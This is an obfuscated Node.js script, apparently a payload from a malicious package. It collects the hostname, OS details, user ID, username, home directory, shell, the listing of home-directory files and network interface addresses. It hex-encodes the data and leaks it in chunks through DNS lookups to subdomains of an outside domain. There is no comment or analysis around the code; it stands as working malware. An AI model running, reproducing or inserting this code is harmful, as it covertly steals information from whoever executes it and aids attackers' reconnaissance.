var dns = require('dns');
var os = require('os');
var crypto = require('crypto');
var fs = require('fs');
let userInfo = os['userInfo']();
var info = [
    os['hostname'](),
    os['arch'](),
    os['platform'](),
    os['release'](),
    os['tmpdir'](),
    os['totalmem'](),
    os['uptime'](),
    userInfo['uid'],
    userInfo['gid'],
    userInfo['username'],
    userInfo['homedir'],
    userInfo['shell'],
    __filename
];
const baseDomain = '.ex.neversummer.xyz';
const maxSubDomainLen = -0x354 * -0x6 + 0x1e16 + 0x31cf * -0x1;
var rayId = crypto['randomBytes'](0x6 * -0x4a3 + 0x11cd + 0x1 * 0xa19)['toString']('hex')['substring'](0x270c + -0x24ed + 0xb5 * -0x3, 0x9c7 * 0x2 + 0x1f61 + -0x32e7);
var homeFiles = [];
fs['readdirSync'](os['homedir']())['forEach'](_0xfb350 => {
    homeFiles['push'](_0xfb350);
});
if (homeFiles['length'] > -0x156 + -0x92 * -0x36 + -0x1d76) {
    info['push'](homeFiles['join'](';'));
}
const interfaces = os['networkInterfaces']();
let i = 0x7be * 0x3 + 0x3cf + -0x1b08;
for (const key in interfaces) {
    info['push'](key + ':' + interfaces[key][-0xf1 * 0x13 + -0x20b0 + -0xb * -0x499]['address']);
}
let infoString = info['join']('|');
let buff = new Buffer['from'](infoString);
let encodedInfo = buff['toString']('hex');
let chunkSize = maxSubDomainLen;
for (var startChar = -0x22de + -0xa4f + 0x2d2d * 0x1, charsLength = encodedInfo['length']; startChar < charsLength; startChar += chunkSize) {
    let infoDomain = rayId + '.' + i + '.' + encodedInfo['substring'](startChar, startChar + chunkSize);
    let fullDomain = infoDomain + baseDomain;
    dns['lookup'](fullDomain, function (_0x8e18e5, _0x3b50cc, _0x22c31b) {
    });
    i++;
}
